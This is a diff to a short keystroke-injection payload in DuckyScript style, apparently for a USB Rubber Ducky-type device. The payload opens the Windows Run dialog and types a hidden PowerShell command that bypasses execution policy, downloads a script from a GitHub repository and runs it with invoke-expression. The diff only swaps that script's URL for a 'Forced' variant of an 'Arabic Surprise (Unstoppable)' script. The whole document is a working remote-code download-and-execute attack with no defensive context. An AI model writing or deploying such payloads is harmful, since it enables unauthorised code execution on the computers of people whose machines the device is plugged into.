@@ -1,6 +1,6 @@
 WINDOWS r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/MajorMarmalade/Sounds/refs/heads/main/Arabic%20Surprise%20(Unstoppable)/Arabic%20Surprise%20(Unstoppable).ps1?dl=1; invoke-expression $pl
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://github.com/MajorMarmalade/Sounds/raw/refs/heads/main/Arabic%20Surprise%20(Unstoppable)/Arabic%20Surprise%20Forced.ps1?dl=1; invoke-expression $pl
 ENTER
 DELAY 1000
 WINDOWS M
